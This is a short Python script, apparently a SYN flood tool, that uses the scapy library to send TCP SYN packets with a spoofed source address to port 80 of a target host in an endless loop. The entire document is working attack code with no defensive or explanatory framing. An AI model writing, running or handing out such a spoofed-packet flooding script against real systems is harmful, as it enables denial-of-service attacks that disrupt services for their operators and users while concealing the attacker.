import time
from scapy.layers.inet import TCP, IP
from scapy.sendrecv import send

# Define the target and spoofed IP
target_ip = "www.example.com"
spoofed_ip = "192.168.1.100"
target_port = 80

# Create and send SYN packets
while True:
    packet = IP(src=spoofed_ip, dst=target_ip)/TCP(dport=target_port, flags="S")
    send(packet, count=10)# Send 10 packets
    time.sleep(1)
